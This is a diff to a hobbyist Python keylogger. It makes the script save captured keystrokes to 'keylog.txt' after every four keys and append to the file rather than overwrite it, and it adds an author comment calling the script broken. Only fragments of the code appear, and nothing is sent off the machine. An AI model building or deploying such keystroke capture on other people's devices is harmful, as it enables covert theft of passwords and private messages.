@@ -12,7 +12,7 @@ def on_press(key):
     count += 1
     print("{0} key pressed on keyboard".format(key))
 
-    if count >= 8400:
+    if count >= 4:
         # This numerical value can be changed, however many keys are pressed, the log file will update
         count = 0
         write_file(keys)
@@ -27,7 +27,7 @@ def on_release(key):
 # Key that will end the script, default is set to Escape (esc)
 
 def write_file(keys):
-    with open("keylog.txt", "w") as f:
+    with open("keylog.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
@@ -42,3 +42,4 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 
 
 # Made by Damien/GunFighterMan101
+# I really tried with this one don't heckle me because it's broken. Fix it if you are so upset. Thanks for understanding, 73.
